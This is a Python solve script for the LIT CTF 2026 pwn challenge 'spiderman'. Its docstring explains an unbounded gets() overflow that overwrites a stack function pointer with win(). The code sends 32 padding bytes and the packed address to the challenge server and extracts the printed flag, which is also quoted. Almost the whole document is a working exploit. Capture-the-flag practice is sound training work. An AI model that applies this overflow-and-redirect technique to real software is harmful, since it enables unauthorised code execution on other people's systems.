#!/usr/bin/env python3
"""
LIT CTF 2026 — pwn — "spiderman"   (nc 136.115.87.65 31778)

The spiderman meme = two pointers pointing at each other.

main() lays out a stack buffer `buf` at [rbp-0x30] and a FUNCTION POINTER at
[rbp-0x10], initialised to introduction(). It then:
    gets(buf);                 // UNBOUNDED read
    ((void(*)(char*))fptr)(buf);
Distance buf -> fptr = 0x30 - 0x10 = 0x20 = 32 bytes. gets() has no bounds, so we
overflow those 32 bytes and overwrite the function pointer with win() (0x4011f6,
non-PIE). main then `call`s win, which cats flag.txt.

  LITCTF{p01nt3r-Po1ntEr-wh3re-4rE-y0U}
"""
import socket, time, struct, re

HOST, PORT = "136.115.87.65", 31778
WIN = 0x4011f6

def main():
    payload = b"A" * 0x20 + struct.pack("<Q", WIN)
    s = socket.socket(); s.settimeout(6); s.connect((HOST, PORT))
    time.sleep(0.4); s.sendall(payload + b"\n"); time.sleep(1.0)
    out = b""
    while True:
        try:
            c = s.recv(4096)
            if not c: break
            out += c
        except socket.timeout:
            break
    flag = re.search(rb"LITCTF\{[^}]*\}", out)
    print(out.decode("latin1"))
    print("[+]", flag.group().decode() if flag else "no flag")

if __name__ == "__main__":
    main()
